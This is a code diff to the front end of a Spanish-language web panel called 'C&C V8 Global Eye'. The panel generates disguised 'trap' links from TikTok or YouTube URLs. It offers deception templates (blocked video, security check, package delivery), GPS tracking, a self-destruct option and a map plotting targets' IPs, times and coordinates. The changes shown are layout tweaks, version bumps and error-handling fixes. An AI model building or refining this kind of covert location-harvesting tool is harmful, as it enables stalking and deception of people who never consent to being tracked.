@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>C&C V8.1 Global Eye</title>
+    <title>C&C V8 Global Eye</title>
     
     <script>
         if (!sessionStorage.getItem("secure_token")) {
@@ -37,7 +37,7 @@
         
         /* MAPA */
         #map-container { height: 100%; width: 100%; border-radius: 20px; overflow: hidden; display: none; }
-        #map { height: 100%; width: 100%; }
+        #map { height: 100%; width: 100%; background-color: #1e1e24; }
 
         /* BARRA DE NAVEGACIÓN */
         .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 15, 17, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0 25px 0; z-index: 100; }
@@ -92,7 +92,7 @@
 <body>
 
     <div class="header">
-        <h1>GLOBAL EYE <span style="color:var(--accent)">V8</span></h1>
+        <h1>GLOBAL EYE <span style="color:var(--accent)">V8.2</span></h1>
         <a href="/logout" style="text-decoration:none;">
             <div class="status-badge" style="background:rgba(255, 71, 87, 0.1); color:#ff4757; border-color:rgba(255, 71, 87, 0.3);">
                 <span class="material-icons-round" style="font-size:14px;">logout</span> SALIR
@@ -106,20 +106,14 @@
             <div class="card">
                 <label class="label">LINK REAL (TIKTOK/YOUTUBE)</label>
                 <input type="text" id="urlDestino" placeholder="Pega el enlace aquí...">
-                <div style="height:10px"></div>
+                <div style="height:15px"></div>
                 <label class="label">NOMBRE REFERENCIA</label>
                 <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
                 
-                <div style="height:15px"></div>
-                <label class="label">HISTORIA DE ENGAÑO (DISFRAZ)</label>
-                <select id="templateType" style="margin-bottom:15px;">
-                    <option value="security">🛡️ Verificación de Seguridad (Genérico)</option>
-                    <option value="video" selected>📺 Video Bloqueado (Para TikTok)</option>
-                    <option value="delivery">📦 Entrega de Paquete</option>
-                </select>
-
+                <div style="height:20px"></div>
+                
                 <div class="row-switch">
-                    <span style="font-size:12px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
+                    <span style="font-size:13px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
                     <label class="switch">
                         <input type="checkbox" id="checkGPS" checked>
                         <span class="slider round"></span>
@@ -127,12 +121,20 @@
                 </div>
                 
                 <div class="row-switch">
-                    <span style="font-size:12px; font-weight:600;">💥 AUTODESTRUCCIÓN (1 USO)</span>
+                    <span style="font-size:13px; font-weight:600;">💥 AUTODESTRUCCIÓN (1 USO)</span>
                     <label class="switch">
                         <input type="checkbox" id="checkBurn">
                         <span class="slider round"></span>
                     </label>
                 </div>
+
+                <div style="height:15px"></div>
+                <label class="label">PLANTILLA DE ENGAÑO (DISFRAZ)</label>
+                <select id="templateType" style="margin-bottom:15px;">
+                    <option value="video" selected>📺 Video Bloqueado (Para TikTok)</option>
+                    <option value="security">🛡️ Verificación de Seguridad</option>
+                    <option value="delivery">📦 Entrega de Paquete</option>
+                </select>
 
                 <div onclick="document.getElementById('adv-opts').style.display='block'; this.style.display='none'" style="text-align:center; font-size:11px; color:var(--text-sec); margin-bottom:15px; cursor:pointer; text-decoration:underline;">⚙️ Personalizar Disfraz</div>
                 
@@ -206,10 +208,7 @@
             logs.forEach(log => {
                 if(log.lat && log.lon) {
                     var circle = L.circleMarker([log.lat, log.lon], {
-                        color: '#ff4757',
-                        fillColor: '#ff4757',
-                        fillOpacity: 0.8,
-                        radius: 8
+                        color: '#ff4757', fillColor: '#ff4757', fillOpacity: 0.8, radius: 8
                     }).addTo(map);
                     circle.bindPopup(`<b>${log.ip}</b><br>${log.hora}`);
                     markers.push(circle);
@@ -217,16 +216,13 @@
             });
         }
 
-        // --- FUNCIÓN DE VUELO ---
         function focalizarObjetivo(lat, lon) {
-            // 1. Cambiar pestaña visualmente
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             
             document.getElementById('view-map').classList.add('active');
             document.querySelectorAll('.nav-item')[2].classList.add('active');
 
-            // 2. Cargar mapa y volar
             setTimeout(() => {
                 initMap();
                 map.invalidateSize(); 
@@ -274,8 +270,11 @@
                 });
                 let data = await res.json();
                 
-                // Verificación de error
-                if(data.error || !data.link) throw new Error(data.error || "Error desconocido");
+                // --- CORRECCIÓN PARA EL ERROR UNDEFINED ---
+                if (data.error || !data.link) {
+                    throw new Error(data.error || "Error desconocido del servidor");
+                }
+                // ------------------------------------------
 
                 Swal.fire({
                     title: '¡Enlace Listo!', text: data.link, icon: 'success',
@@ -289,7 +288,7 @@
                 });
                 btn.innerHTML = originalText;
             } catch(e) { 
-                Swal.fire({icon: 'error', title: 'Error', text: e.message, background:'#1e1e24', color:'#fff'});
+                Swal.fire({icon: 'error', title: 'Error', text: e.message || 'Error de conexión', background: '#1e1e24', color: '#fff'});
                 btn.innerHTML = originalText; 
             }
         }
